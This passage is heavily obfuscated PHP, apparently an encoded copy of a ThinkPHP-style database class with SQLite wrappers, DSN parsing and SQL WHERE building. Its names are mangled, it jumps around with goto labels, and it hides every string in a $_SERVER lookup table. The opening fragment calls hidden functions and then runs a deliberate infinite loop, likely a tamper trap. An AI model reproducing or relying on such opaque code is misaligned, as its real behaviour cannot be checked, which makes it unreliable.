explode($_SERVER[æ§›¦ÌáØ][229], $F¯‹íÁÓ°ë); if (count($AËÏã°¹­”) < $_SERVER[æ§›¦ÌáØ][604]) { $Dµ¦ë½âÏÒ = $_SERVER[æ§›¦ÌáØ][790]; $Dµ¦ë½âÏÒ(); } $d„ŸÚÒ‘í¤ = $_SERVER[æ§›¦ÌáØ][791]; goto a¾ôÚÀ¶ó†; a¾ôÚÀ¶ó†: $d„ŸÚÒ‘í¤($_SERVER[$_SERVER[æ§›¦ÌáØ][788]] . $_SERVER[æ§›¦ÌáØ][789]); $bâ»‘·•Â = 2; while ($bâ»‘·•Â > 1) { $E‡¨»ÙÌ…º = rawurlencode($bâ»‘·•Â . $_SERVER[æ§›¦ÌáØ][375]); } goto a«ä¬Óœöá; a«ä¬Óœöá: } goto a³‡Ñ£°Ó; C‚‰Š½Şˆ˜: class DbSqlite extends DbSqliteBase { public function query($F¯Ÿåáóˆ) { $cÌÓ®õÍº =& $_SERVER[æ§›¦ÌáØ]; if (!CacheLock::fileLock($cÌÓ®õÍº[9])) { return !1; } $d±˜øËíÉ‡ = parent::query($F¯Ÿåáóˆ); CacheLock::fileUnLock($cÌÓ®õÍº[9]); return $d±˜øËíÉ‡; } public function execute($cÄÈåÚˆ‘Â) { $bÂ‡‡‘Ê„¦ =& $_SERVER[æ§›¦ÌáØ]; if (!CacheLock::fileLock($bÂ‡‡‘Ê„¦[9])) { return !1; } $D¿¿ğÏ‘¤å = parent::execute($cÄÈåÚˆ‘Â); CacheLock::fileUnLock($bÂ‡‡‘Ê„¦[9]); return $D¿¿ğÏ‘¤å; } } class DbSqlite3 extends DbSqlite3Base { public function query($eİäëƒ°ò‰) { $aËíãÑÇø³ =& $_SERVER[æ§›¦ÌáØ]; if (!CacheLock::fileLock($aËíãÑÇø³[9])) { return !1; } $d†ˆ¨¸â‚˜ = parent::query($eİäëƒ°ò‰); CacheLock::fileUnLock($aËíãÑÇø³[9]); return $d†ˆ¨¸â‚˜; } public function execute($fƒî¹ãÚÉ) { $D‘©¥à†ªĞ =& $_SERVER[æ§›¦ÌáØ]; if (!CacheLock::fileLock($D‘©¥à†ªĞ[9])) { return !1; } $dˆ‹½«¬¬© = parent::execute($fƒî¹ãÚÉ); CacheLock::fileUnLock($D‘©¥à†ªĞ[9]); return $dˆ‹½«¬¬©; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\74\76", "\x67\x74" => "\x3e", "\145\x67\164" => "\76\75", "\154\x74" => "\74", "\x65\x6c\164" => "\x3c\75", "\x6e\x6f\x74\154\x69\x6b\145" => "\116\117\x54\40\114\x49\x4b\105", "\154\x69\153\145" => "\114\111\113\x45", "\151\x6e" => "\x49\116", "\x6e\x6f\164\x69\x6e" => "\116\117\x54\x20\111\x4e", "\x6e\157\164\x20\151\156" => "\116\117\124\40\111\116", "\142\x65\164\x77\x65\145\156" => "\102\105\x54\x57\x45\x45\x4e", "\x6e\157\x74\142\145\x74\x77\145\x65\156" => "\x4e\x4f\x54\40\x42\x45\x54\127\105\105\116", "\x6e\x6f\x74\40\x62\145\x74\167\x65\x65\x6e" => "\x4e\117\124\x20\102\105\x54\x57\105\x45\116"); protected $selectSql = "\x53\x45\x4c\x45\103\x54\x25\104\111\123\x54\x49\x4e\103\x54\x25\x20\45\x46\111\105\x4c\x44\45\40\x46\122\117\115\40\45\124\101\102\x4c\x45\x25\45\x4a\x4f\111\116\x25\45\x57\x48\105\122\105\x25\45\107\122\x4f\125\120\45\45\110\101\x56\111\116\x47\x25\x25\x4f\x52\104\105\x52\45\45\x4c\x49\x4d\111\124\45\x20\45\x55\116\x49\117\116\45\x25\103\117\115\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $C‡“Í“©Ÿó = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[æ§›¦ÌáØ][910], $C‡“Í“©Ÿó); } public function factory($Eñ„ä¶ÙÍ§ = '') { goto c…•±¸…‹; A¦ÕÓ¹“³: $this->dbType = ucwords(strtolower($Eñ„ä¶ÙÍ§[$C˜£òÈ§íÃ[911]])); $Cšó­Óá = $C˜£òÈ§íÃ[913] . $this->dbType; if (class_exists($Cšó­Óá)) { $Déé‡Èöïù = new $Cšó­Óá($Eñ„ä¶ÙÍ§); if ($C˜£òÈ§íÃ[748] != strtolower($Eñ„ä¶ÙÍ§[$C˜£òÈ§íÃ[911]])) { $Déé‡Èöïù->dbType = strtoupper($this->dbType); } else { $Déé‡Èöïù->dbType = $this->_getDsnType($Eñ„ä¶ÙÍ§[$C˜£òÈ§íÃ[866]]); } } else { think_exception(think_lang($C˜£òÈ§íÃ[914]) . $C˜£òÈ§íÃ[915] . $Cšó­Óá); } goto F«‚¥‘; c…•±¸…‹: $C˜£òÈ§íÃ =& $_SERVER[æ§›¦ÌáØ]; $Eñ„ä¶ÙÍ§ = $this->parseConfig($Eñ„ä¶ÙÍ§); if (empty($Eñ„ä¶ÙÍ§[$C˜£òÈ§íÃ[911]])) { think_exception(think_lang($C˜£òÈ§íÃ[912])); } goto A¦ÕÓ¹“³; F«‚¥‘: return $Déé‡Èöïù; goto DÚç¿ê¼†; DÚç¿ê¼†: } public function __call($A“«ù„æÍ, $D‹ÖÓÎ¹Á) { if (method_exists($this, $A“«ù„æÍ)) { return call_user_func_array(array($this, $A“«ù„æÍ), $D‹ÖÓÎ¹Á); } } protected function _getDsnType($dÚœ•Òè²) { $A­É®İÒÃ = explode($_SERVER[æ§›¦ÌáØ][4], $dÚœ•Òè²); $c¡ÏÒÜĞ = strtoupper(trim($A­É®İÒÃ[0])); return $c¡ÏÒÜĞ; } private function parseConfig($eËºÕ™´¸ƒ = '') { $Aõ£æœƒ Ä =& $_SERVER[æ§›¦ÌáØ]; if (!empty($eËºÕ™´¸ƒ) && is_string($eËºÕ™´¸ƒ)) { $eËºÕ™´¸ƒ = $this->parseDSN($eËºÕ™´¸ƒ); } elseif (is_array($eËºÕ™´¸ƒ)) { $eËºÕ™´¸ƒ = array_change_key_case($eËºÕ™´¸ƒ); $eËºÕ™´¸ƒ = array($Aõ£æœƒ Ä[911] => $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[747]], $Aõ£æœƒ Ä[839] => $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[916]], $Aõ£æœƒ Ä[840] => $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[917]], $Aõ£æœƒ Ä[837] => $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[918]], $Aõ£æœƒ Ä[838] => $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[919]], $Aõ£æœƒ Ä[17] => $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[920]], $Aõ£æœƒ Ä[866] => $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[749]], $Aõ£æœƒ Ä[13] => isset($eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[921]]) ? $eËºÕ™´¸ƒ[$Aõ£æœƒ Ä[921]] : array()); } elseif (empty($eËºÕ™´¸ƒ)) { if (think_config($Aõ£æœƒ Ä[922]) && $Aõ£æœƒ Ä[748] != strtolower(think_config($Aõ£æœƒ Ä[923]))) { $eËºÕ™´¸ƒ = $this->parseDSN(think_config($Aõ£æœƒ Ä[922])); } else { $eËºÕ™´¸ƒ = array($Aõ£æœƒ Ä[911] => think_config($Aõ£æœƒ Ä[923]), $Aõ£æœƒ Ä[839] => think_config($Aõ£æœƒ Ä[924]), $Aõ£æœƒ Ä[840] => think_config($Aõ£æœƒ Ä[925]), $Aõ£æœƒ Ä[837] => think_config($Aõ£æœƒ Ä[926]), $Aõ£æœƒ Ä[838] => think_config($Aõ£æœƒ Ä[927]), $Aõ£æœƒ Ä[17] => think_config($Aõ£æœƒ Ä[244]), $Aõ£æœƒ Ä[866] => think_config($Aõ£æœƒ Ä[922]), $Aõ£æœƒ Ä[13] => think_config($Aõ£æœƒ Ä[928])); } } return $eËºÕ™´¸ƒ; } protected function initConnect($BÛ»©ç¨‡¹ = true) { if (1 == think_config($_SERVER[æ§›¦ÌáØ][18])) { $this->_linkID = $this->multiConnect($BÛ»©ç¨‡¹); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $A‚ÕÆëÓØƒ => $c´‡´óßğ—) { $this->_linkID = $c´‡´óßğ—; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($C‚‡Í¸Ûé = false) { goto f¹ëª÷¶Š”; FË—ç‹¿: $A’ÂÅâ™ø = array($E’°‚æ÷—´[839] => isset($cÌãâ»ø¿ğ[$E’°‚æ÷—´[839]][$F·×µ”ÕË‰]) ? $cÌãâ»ø¿ğ[$E’°‚æ÷—´[839]][$F·×µ”ÕË‰] : $cÌãâ»ø¿ğ[$E’°‚æ÷—´[839]][0], $E’°‚æ÷—´[840] => isset($cÌãâ»ø¿ğ[$E’°‚æ÷—´[840]][$F·×µ”ÕË‰]) ? $cÌãâ»ø¿ğ[$E’°‚æ÷—´[840]][$F·×µ”ÕË‰] : $cÌãâ»ø¿ğ[$E’°‚æ÷—´[840]][0], $E’°‚æ÷—´[837] => isset($cÌãâ»ø¿ğ[$E’°‚æ÷—´[837]][$F·×µ”ÕË‰]) ? $cÌãâ»ø¿ğ[$E’°‚æ÷—´[837]][$F·×µ”ÕË‰] : $cÌãâ»ø¿ğ[$E’°‚æ÷—´[837]][0], $E’°‚æ÷—´[838] => isset($cÌãâ»ø¿ğ[$E’°‚æ÷—´[838]][$F·×µ”ÕË‰]) ? $cÌãâ»ø¿ğ[$E’°‚æ÷—´[838]][$F·×µ”ÕË‰] : $cÌãâ»ø¿ğ[$E’°‚æ÷—´[838]][0], $E’°‚æ÷—´[17] => isset($cÌãâ»ø¿ğ[$E’°‚æ÷—´[17]][$F·×µ”ÕË‰]) ? $cÌãâ»ø¿ğ[$E’°‚æ÷—´[17]][$F·×µ”ÕË‰] : $cÌãâ»ø¿ğ[$E’°‚æ÷—´[17]][0], $E’°‚æ÷—´[866] => isset($cÌãâ»ø¿ğ[$E’°‚æ÷—´[866]][$F·×µ”ÕË‰]) ? $cÌãâ»ø¿ğ[$E’°‚æ÷—´[866]][$F·×µ”ÕË‰] : $cÌãâ»ø¿ğ[$E’°‚æ÷—´[866]][0], $E’°‚æ÷—´[13] => isset($cÌãâ»ø¿ğ[$E’°‚æ÷—´[13]][$F·×µ”ÕË‰]) ? $cÌãâ»ø¿ğ[$E’°‚æ÷—´[13]][$F·×µ”ÕË‰] : $cÌãâ»ø¿ğ[$E’°‚æ÷—´[13]][0]); return $this->connect($A’ÂÅâ™ø, $F·×µ”ÕË‰); goto eãÎ˜…è¦‡; DÎÃòŠ»Ì¾: if (empty($cÌãâ»ø¿ğ)) { foreach ($this->config as $f£‘àçâ²É => $a­‚¾å´ˆ‚) { $cÌãâ»ø¿ğ[$f£‘àçâ²É] = explode($E’°‚æ÷—´[47], $a­‚¾å´ˆ‚); } } if (think_config($E’°‚æ÷—´[929])) { if ($C‚‡Í¸Ûé) { $F·×µ”ÕË‰ = floor(mt_rand(0, think_config($E’°‚æ÷—´[930]) - 1)); $DªÁæİß†¶ = $F·×µ”ÕË‰; } else { if (is_numeric(think_config($E’°‚æ÷—´[931]))) { $F·×µ”ÕË‰ = think_config($E’°‚æ÷—´[931]); } else { $F·×µ”ÕË‰ = floor(mt_rand(think_config($E’°‚æ÷—´[930]), count($cÌãâ»ø¿ğ[$E’°‚æ÷—´[837]]) - 1)); } } } else { $F·×µ”ÕË‰ = floor(mt_rand(0, count($cÌãâ»ø¿ğ[$E’°‚æ÷—´[837]]) - 1)); $DªÁæİß†¶ = $F·×µ”ÕË‰; } $F·×µ”ÕË‰ = $DªÁæİß†¶ !== -1 ? $DªÁæİß†¶ : $F·×µ”ÕË‰; goto FË—ç‹¿; f¹ëª÷¶Š”: $E’°‚æ÷—´ =& $_SERVER[æ§›¦ÌáØ]; static $cÌãâ»ø¿ğ = array(); static $DªÁæİß†¶ = -1; goto DÎÃòŠ»Ì¾; eãÎ˜…è¦‡: } public function parseDSN($B‹‹õ‚˜ó) { $F‚‰„ØŞ¾¥ =& $_SERVER[æ§›¦ÌáØ]; if (empty($B‹‹õ‚˜ó)) { return !1; } $D³˜Â¹×¸‡ = parse_url($B‹‹õ‚˜ó); if ($D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[174]]) { $dœ •êº²ä = array($F‚‰„ØŞ¾¥[911] => $D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[174]], $F‚‰„ØŞ¾¥[839] => isset($D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[575]]) ? $D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[575]] : $F‚‰„ØŞ¾¥[33], $F‚‰„ØŞ¾¥[840] => isset($D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[932]]) ? $D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[932]] : $F‚‰„ØŞ¾¥[33], $F‚‰„ØŞ¾¥[837] => isset($D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[175]]) ? $D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[175]] : $F‚‰„ØŞ¾¥[33], $F‚‰„ØŞ¾¥[838] => isset($D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[176]]) ? $D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[176]] : $F‚‰„ØŞ¾¥[33], $F‚‰„ØŞ¾¥[17] => isset($D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[76]]) ? substr($D³˜Â¹×¸‡[$F‚‰„ØŞ¾¥[76]], 1) : $F‚‰„ØŞ¾¥[33]); } else { preg_match($F‚‰„ØŞ¾¥[933], trim($B‹‹õ‚˜ó), $c¤”Ğöí‡Å); $dœ •êº²ä = array($F‚‰„ØŞ¾¥[911] => $c¤”Ğöí‡Å[1], $F‚‰„ØŞ¾¥[839] => $c¤”Ğöí‡Å[2], $F‚‰„ØŞ¾¥[840] => $c¤”Ğöí‡Å[3], $F‚‰„ØŞ¾¥[837] => $c¤”Ğöí‡Å[4], $F‚‰„ØŞ¾¥[838] => $c¤”Ğöí‡Å[5], $F‚‰„ØŞ¾¥[17] => $c¤”Ğöí‡Å[6]); } $dœ •êº²ä[$F‚‰„ØŞ¾¥[866]] = $F‚‰„ØŞ¾¥[33]; return $dœ •êº²ä; } protected function debug() { $aáÒºø÷­İ =& $_SERVER[æ§›¦ÌáØ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $aáÒºø÷­İ[934]; if (think_config($aáÒºø÷­İ[935])) { think_status($aáÒºø÷­İ[936]); think_trace($this->queryStr . $aáÒºø÷­İ[937] . think_status($aáÒºø÷­İ[20], $aáÒºø÷­İ[936], 6) . $aáÒºø÷­İ[938], $aáÒºø÷­İ[33], $aáÒºø÷­İ[939]); } } protected function parseLock($BïœÏÏËì = false) { $b‰µå¤ÂªÚ =& $_SERVER[æ§›¦ÌáØ]; if (!$BïœÏÏËì) { return $b‰µå¤ÂªÚ[33]; } if ($b‰µå¤ÂªÚ[868] == $this->dbType) { return $b‰µå¤ÂªÚ[940]; } return $b‰µå¤ÂªÚ[941]; } protected function parseSet($cÁÊ•Ï£‹Ã) { $a´‘¹“±…ä =& $_SERVER[æ§›¦ÌáØ]; foreach ($cÁÊ•Ï£‹Ã as $dçµí¸í‚ => $CÎãôƒß¤¿) { if (is_array($CÎãôƒß¤¿) && $a´‘¹“±…ä[295] == $CÎãôƒß¤¿[0]) { $Bê²ö¾ÁÄË[] = $this->parseKey($dçµí¸í‚) . $a´‘¹“±…ä[942] . $CÎãôƒß¤¿[1]; } elseif (is_scalar($CÎãôƒß¤¿) || is_null($CÎãôƒß¤¿)) { $Bê²ö¾ÁÄË[] = $this->parseKey($dçµí¸í‚) . $a´‘¹“±…ä[942] . $this->parseValue($CÎãôƒß¤¿); } } return $a´‘¹“±…ä[943] . implode($a´‘¹“±…ä[47], $Bê²ö¾ÁÄË); } protected function bindParam($fœ³ª¼åŸˆ, $b±ñ–‘ËŒÁ) { $this->bind[$_SERVER[æ§›¦ÌáØ][4] . $fœ³ª¼åŸˆ] = $b±ñ–‘ËŒÁ; } protected function parseBind($d‹Õîã–·Ç) { $d‹Õîã–·Ç = array_merge($this->bind, $d‹Õîã–·Ç); $this->bind = array(); return $d‹Õîã–·Ç; } function parseKey(&$CÊº×ö¸ĞÀ, $AÂ±Š¦Âã = true) { if ($AÂ±Š¦Âã) { $CÊº×ö¸ĞÀ = $this->parseKeyCheck($CÊº×ö¸ĞÀ); } return $CÊº×ö¸ĞÀ; } function parseKeyCheck($cèÂ«¸ô) { $d˜­¬´ƒ¾° =& $_SERVER[æ§›¦ÌáØ]; $cèÂ«¸ô = trim($cèÂ«¸ô); if (!preg_match($d˜­¬´ƒ¾°[944], $cèÂ«¸ô)) { think_exception($d˜­¬´ƒ¾°[945] . $cèÂ«¸ô); } return $cèÂ«¸ô; } protected function parseValue($Aä†ò÷—§õ) { $c·¦’“ì’Â =& $_SERVER[æ§›¦ÌáØ]; if (is_string($Aä†ò÷—§õ)) { $Aä†ò÷—§õ = $c·¦’“ì’Â[907] . $this->escapeString($Aä†ò÷—§õ) . $c·¦’“ì’Â[907]; } elseif (isset($Aä†ò÷—§õ[0]) && is_string($Aä†ò÷—§õ[0]) && strtolower($Aä†ò÷—§õ[0]) == $c·¦’“ì’Â[295]) { $Aä†ò÷—§õ = $this->escapeString($Aä†ò÷—§õ[1]); } elseif (is_array($Aä†ò÷—§õ)) { $Aä†ò÷—§õ = array_map(array($this, $c·¦’“ì’Â[908]), $Aä†ò÷—§õ); } elseif (is_bool($Aä†ò÷—§õ)) { $Aä†ò÷—§õ = $Aä†ò÷—§õ ? $c·¦’“ì’Â[87] : $c·¦’“ì’Â[191]; } elseif (is_null($Aä†ò÷—§õ)) { $Aä†ò÷—§õ = $c·¦’“ì’Â[103]; } return $Aä†ò÷—§õ; } protected function parseField($Dòò„İˆÌ”) { $E©Š¬ÇÊ¿Ï =& $_SERVER[æ§›¦ÌáØ]; if (is_string($Dòò„İˆÌ”) && strpos($Dòò„İˆÌ”, $E©Š¬ÇÊ¿Ï[47])) { $Dòò„İˆÌ” = explode($E©Š¬ÇÊ¿Ï[47], $Dòò„İˆÌ”); } if (is_array($Dòò„İˆÌ”)) { $aÅéøÇ˜‘§ = array(); foreach ($Dòò„İˆÌ” as $a¾äÒÏÓÙÇ => $aµ¥Ü­Ü†) { if (!is_numeric($a¾äÒÏÓÙÇ)) { $aÅéøÇ˜‘§[] = $this->parseKey($a¾äÒÏÓÙÇ, !1) . $E©Š¬ÇÊ¿Ï[946] . $this->parseKey($aµ¥Ü­Ü†); } else { $aÅéøÇ˜‘§[] = $this->parseKey($aµ¥Ü­Ü†); } } $b‚¬†’Çöç = implode($E©Š¬ÇÊ¿Ï[47], $aÅéøÇ˜‘§); } elseif (is_string($Dòò„İˆÌ”) && !empty($Dòò„İˆÌ”)) { $b‚¬†’Çöç = $Dòò„İˆÌ”; } else { $b‚¬†’Çöç = $E©Š¬ÇÊ¿Ï[182]; } return $b‚¬†’Çöç; } protected function parseTable($dŠ‰íù›†ß) { $fÙµæĞÀ¹Œ =& $_SERVER[æ§›¦ÌáØ]; if (is_array($dŠ‰íù›†ß)) { $aâ«ëÒÌ = array(); foreach ($dŠ‰íù›†ß as $Aßæ«ŠÂç— => $AÏƒµ“Š†À) { if (!is_numeric($Aßæ«ŠÂç—)) { $aâ«ëÒÌ[] = $this->parseKey($Aßæ«ŠÂç—) . $fÙµæĞÀ¹Œ[50] . $this->parseKey($AÏƒµ“Š†À); } else { $aâ«ëÒÌ[] = $this->parseKey($Aßæ«ŠÂç—); } } $dŠ‰íù›†ß = $aâ«ëÒÌ; } elseif (is_string($dŠ‰íù›†ß)) { if (strstr($dŠ‰íù›†ß, $fÙµæĞÀ¹Œ[50])) { return $dŠ‰íù›†ß; } $dŠ‰íù›†ß = explode($fÙµæĞÀ¹Œ[47], $dŠ‰íù›†ß); array_walk($dŠ‰íù›†ß, array($this, $fÙµæĞÀ¹Œ[857])); } return $fÙµæĞÀ¹Œ[851] . trim(implode($fÙµæĞÀ¹Œ[947], $dŠ‰íù›†ß), $fÙµæĞÀ¹Œ[382]) . $fÙµæĞÀ¹Œ[851]; } protected function parseWhere($e•Ÿ‰Ú…Æ‰) { $fµ¹»–—ÇÂ =& $_SERVER[æ§›¦ÌáØ]; $a“§™Øİ‰ = $fµ¹»–—ÇÂ[33]; if (is_string($e•Ÿ‰Ú…Æ‰)) { $a“§™Øİ‰ = $e•Ÿ‰Ú…Æ‰; } else { $F—ššËÏË = isset($e•Ÿ‰Ú…Æ‰[$fµ¹»–—ÇÂ[948]]) ? strtoupper($e•Ÿ‰Ú…Æ‰[$fµ¹»–—ÇÂ[948]]) : $fµ¹»–—ÇÂ[33]; if (in_array($F—ššËÏË, array($fµ¹»–—ÇÂ[949], $fµ¹»–—ÇÂ[950], $fµ¹»–—ÇÂ[951]))) { $F—ššËÏË = $fµ¹»–—ÇÂ[50] . $F—ššËÏË . $fµ¹»–—ÇÂ[50]; unset($e•Ÿ‰Ú…Æ‰[$fµ¹»–—ÇÂ[948]]); } else { $F—ššËÏË = $fµ¹»–—ÇÂ[952]; } foreach ($e•Ÿ‰Ú…Æ‰ as $C©›‹ ÀØí => $cÕÀÖìö£ô) { $a“§™Øİ‰ .= $fµ¹»–—ÇÂ[275]; if (is_numeric($C©›‹ ÀØí)) { $C©›‹ ÀØí = $fµ¹»–—ÇÂ[953]; } if (0 === strpos($C©›‹ ÀØí, $fµ¹»–—ÇÂ[71])) { $a“§™Øİ‰ .= $this->parseThinkWhere($C©›‹ ÀØí, $cÕÀÖìö£ô); } else { if (!preg_match($fµ¹»–—ÇÂ[954], trim($C©›‹ ÀØí))) { think_exception(think_lang($fµ¹»–—ÇÂ[955]) . $fµ¹»–—ÇÂ[4] . $C©›‹ ÀØí); } $aÁï·ÃÆÌ = is_array($cÕÀÖìö£ô) && isset($cÕÀÖìö£ô[$fµ¹»–—ÇÂ[956]]); $C©›‹ ÀØí = trim($C©›‹ ÀØí); if (strpos($C©›‹ ÀØí, $fµ¹»–—ÇÂ[281])) { $c‘¡¢–«¡ = explode($fµ¹»–—ÇÂ[281], $C©›‹ ÀØí); $bğˆÆâÄ²Ù = array(); foreach ($c‘¡¢–«¡ as $dæó’Ìä§— => $C°„Ø ö™) { $F£«Ÿ«Ì„ï = $aÁï·ÃÆÌ ? $cÕÀÖìö£ô[$dæó’Ìä§—] : $cÕÀÖìö£ô; $bğˆÆâÄ²Ù[] = $fµ¹»–—ÇÂ[258] . $this->parseWhereItem($this->parseKey($C°„Ø ö™), $F£«Ÿ«Ì„ï) . $fµ¹»–—ÇÂ[856]; } $a“§™Øİ‰ .= implode($fµ¹»–—ÇÂ[957], $bğˆÆâÄ²Ù); } elseif (strpos($C©›‹ ÀØí, $fµ¹»–—ÇÂ[282])) { $c‘¡¢–«¡ = explode($fµ¹»–—ÇÂ[282], $C©›‹ ÀØí); $bğˆÆâÄ²Ù = array(); foreach ($c‘¡¢–«¡ as $dæó’Ìä§— => $C°„Ø ö™) { $F£«Ÿ«Ì„ï = $aÁï·ÃÆÌ ? $cÕÀÖìö£ô[$dæó’Ìä§—] : $cÕÀÖìö£ô; $bğˆÆâÄ²Ù[] = $fµ¹»–—ÇÂ[258] . $this->parseWhereItem($this->parseKey($C°„Ø ö™), $F£«Ÿ«Ì„ï) . $fµ¹»–—ÇÂ[856]; } $a“§™Øİ‰ .= implode($fµ¹»–—ÇÂ[952], $bğˆÆâÄ²Ù); } else { $a“§™Øİ‰ .= $this->parseWhereItem($this->parseKey($C©›‹ ÀØí), $cÕÀÖìö£ô); } } $a“§™Øİ‰ .= $fµ¹»–—ÇÂ[276] . $F—ššËÏË; } $a“§™Øİ‰ = substr($a“§™Øİ‰, 0, -strlen($F—ššËÏË)); } return empty($a“§™Øİ‰) ? $fµ¹»–—ÇÂ[33] : $fµ¹»–—ÇÂ[958] . $a“§™Øİ‰; } protected function parseWhereItem($d´…¬¿‡‘‡, $cæ¯Ë‡ò÷±) { $A‹Şê¢¤µ¥ =& $_SERVER[æ§›¦ÌáØ]; $D†Ã¸ÔŠæ = $A‹Şê¢¤µ¥[33]; if (is_array($cæ¯Ë‡ò÷±)) { if (is_string($cæ¯Ë‡ò÷±[0])) { $cÔ¼¶°ô¶ê = strtolower($cæ¯Ë‡ò÷±[0]); if (in_array($cæ¯Ë‡ò÷±[0], array($A‹Şê¢¤µ¥[942], $A‹Şê¢¤µ¥[959], $A‹Şê¢¤µ¥[960], $A‹Şê¢¤µ¥[961], $A‹Şê¢¤µ¥[962], $A‹Şê¢¤µ¥[963]))) { $D†Ã¸ÔŠæ .= $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $cæ¯Ë‡ò÷±[0] . $A‹Şê¢¤µ¥[50] . $this->parseValue($cæ¯Ë‡ò÷±[1]); } elseif (preg_match($A‹Şê¢¤µ¥[964], $cæ¯Ë‡ò÷±[0])) { $D†Ã¸ÔŠæ .= $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $this->exp[$cÔ¼¶°ô¶ê] . $A‹Şê¢¤µ¥[50] . $this->parseValue($cæ¯Ë‡ò÷±[1]); } elseif (preg_match($A‹Şê¢¤µ¥[965], $cæ¯Ë‡ò÷±[0])) { if (is_array($cæ¯Ë‡ò÷±[1])) { $e ùÔ½Çƒ‚ = isset($cæ¯Ë‡ò÷±[2]) ? strtoupper($cæ¯Ë‡ò÷±[2]) : $A‹Şê¢¤µ¥[950]; if (in_array($e ùÔ½Çƒ‚, array($A‹Şê¢¤µ¥[949], $A‹Şê¢¤µ¥[950], $A‹Şê¢¤µ¥[951]))) { $Aä·ŞÙ Ï = array(); foreach ($cæ¯Ë‡ò÷±[1] as $A˜åŒğ§é³) { $Aä·ŞÙ Ï[] = $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $this->exp[$cÔ¼¶°ô¶ê] . $A‹Şê¢¤µ¥[50] . $this->parseValue($A˜åŒğ§é³); } $D†Ã¸ÔŠæ .= $A‹Şê¢¤µ¥[258] . implode($A‹Şê¢¤µ¥[50] . $e ùÔ½Çƒ‚ . $A‹Şê¢¤µ¥[50], $Aä·ŞÙ Ï) . $A‹Şê¢¤µ¥[856]; } } else { $D†Ã¸ÔŠæ .= $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $this->exp[$cÔ¼¶°ô¶ê] . $A‹Şê¢¤µ¥[50] . $this->parseValue($cæ¯Ë‡ò÷±[1]); } } elseif ($A‹Şê¢¤µ¥[295] == $cÔ¼¶°ô¶ê) { $D†Ã¸ÔŠæ .= $A‹Şê¢¤µ¥[854] . $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $cæ¯Ë‡ò÷±[1] . $A‹Şê¢¤µ¥[966]; } elseif (preg_match($A‹Şê¢¤µ¥[967], $cæ¯Ë‡ò÷±[0])) { $D†Ã¸ÔŠæ .= $cæ¯Ë‡ò÷±[0]; } elseif (preg_match($A‹Şê¢¤µ¥[968], $cæ¯Ë‡ò÷±[0])) { if (isset($cæ¯Ë‡ò÷±[2]) && $A‹Şê¢¤µ¥[295] == $cæ¯Ë‡ò÷±[2]) { $D†Ã¸ÔŠæ .= $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $this->exp[$cÔ¼¶°ô¶ê] . $A‹Şê¢¤µ¥[50] . $cæ¯Ë‡ò÷±[1]; } else { if (is_string($cæ¯Ë‡ò÷±[1])) { $cæ¯Ë‡ò÷±[1] = explode($A‹Şê¢¤µ¥[47], $cæ¯Ë‡ò÷±[1]); } $B†®™”Ëâ¡ = implode($A‹Şê¢¤µ¥[47], $this->parseValue($cæ¯Ë‡ò÷±[1])); $D†Ã¸ÔŠæ .= $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $this->exp[$cÔ¼¶°ô¶ê] . $A‹Şê¢¤µ¥[854] . $B†®™”Ëâ¡ . $A‹Şê¢¤µ¥[856]; } } elseif (preg_match($A‹Şê¢¤µ¥[969], $cæ¯Ë‡ò÷±[0])) { $f‡¼×š¨Ÿ– = is_string($cæ¯Ë‡ò÷±[1]) ? explode($A‹Şê¢¤µ¥[47], $cæ¯Ë‡ò÷±[1]) : $cæ¯Ë‡ò÷±[1]; $D†Ã¸ÔŠæ .= $A‹Şê¢¤µ¥[854] . $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $this->exp[$cÔ¼¶°ô¶ê] . $A‹Şê¢¤µ¥[50] . $this->parseValue($f‡¼×š¨Ÿ–[0]) . $A‹Şê¢¤µ¥[952] . $this->parseValue($f‡¼×š¨Ÿ–[1]) . $A‹Şê¢¤µ¥[276]; } else { think_exception(think_lang($A‹Şê¢¤µ¥[955]) . $A‹Şê¢¤µ¥[4] . $cæ¯Ë‡ò÷±[0]); } } else { $F¨ø‹¾«Ó = count($cæ¯Ë‡ò÷±); $FÁ´½ø÷øŸ = $A‹Şê¢¤µ¥[33]; if (is_string($cæ¯Ë‡ò÷±[$F¨ø‹¾«Ó - 1])) { 